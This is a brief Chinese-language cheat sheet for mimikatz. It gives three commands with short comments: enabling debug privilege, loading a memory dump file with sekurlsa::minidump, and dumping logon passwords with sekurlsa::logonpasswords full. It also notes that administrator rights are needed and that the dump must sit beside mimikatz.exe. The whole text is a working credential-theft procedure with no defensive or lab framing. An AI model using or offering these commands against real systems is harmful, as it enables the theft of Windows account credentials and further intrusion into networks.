# mimikatz使用命令

## *要用管理员权限打开，目标.dmp文件需要和mimikatz.exe在一个文件夹下

### 命令行

```
//提升权限
privilege::debug
//载入dmp文件
sekurlsa::minidump xxx.dmp
//读取登陆密码
sekurlsa::logonpasswords full
```



